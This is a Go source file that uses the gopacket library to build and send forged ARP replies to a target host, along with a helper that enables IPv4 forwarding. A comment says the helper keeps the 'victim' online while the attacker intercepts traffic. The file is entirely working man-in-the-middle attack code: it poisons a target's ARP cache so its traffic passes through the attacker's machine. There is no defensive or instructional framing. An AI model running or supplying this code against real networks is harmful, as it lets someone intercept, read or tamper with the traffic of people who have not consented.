package main

import (
	"fmt"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"net"
	"os"
)

// Sending Fake ARP reply - even when not asked
func SendARPSpoof(handle *pcap.Handle, targetIP string, targetMAC string, spoofedIP string, attackerInterface networkInterface) error {

	srcMAC, err := net.ParseMAC(attackerInterface.macAddress)
	if err != nil {
		return fmt.Errorf("Invalid source MAC address: %v", err)
	}

	dstMAC, err := net.ParseMAC(targetMAC)
	if err != nil {
		return fmt.Errorf("Invalid destination MAC address: %v", err)
	}

	// Building the Ethernet Layer - the envelope
	eth := layers.Ethernet{
		SrcMAC:       srcMAC,
		DstMAC:       dstMAC,
		EthernetType: layers.EthernetTypeARP,
	}

	// Building the ARP layer - what inside the envelope
	arp := layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         layers.ARPReply,
		SourceHwAddress:   []byte(srcMAC),
		SourceProtAddress: []byte(net.ParseIP(spoofedIP).To4()),
		DstHwAddress:      []byte(dstMAC),
		DstProtAddress:    []byte(net.ParseIP(targetIP).To4()),
	}

	// Serialize the Packet (Convert to raw bytes) -> Need to send raw
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	err = gopacket.SerializeLayers(buf, opts, &eth, &arp)
	if err != nil {
		return fmt.Errorf("failed to serialize packet: %v", err)
	}

	// Send it
	err = handle.WritePacketData(buf.Bytes())
	if err != nil {
		return fmt.Errorf("failed to send ARP spoof: %v", err)
	}

	return nil

}

// This is important — otherwise, the victim loses internet when you intercept traffic.
func EnableIPForwarding() error {
	// 0 (forwarding disabled)
	// 1 (fowarding enabled)
	// echo 1 > /proc/sys/net/ipv4/ip_forward

	err := os.WriteFile("/proc/sys/net/ipv4/ip_forward", []byte("1"), 0644)
	if err != nil {
		return fmt.Errorf("failed to enable IP forwarding: %v", err)
	}

	return nil
}


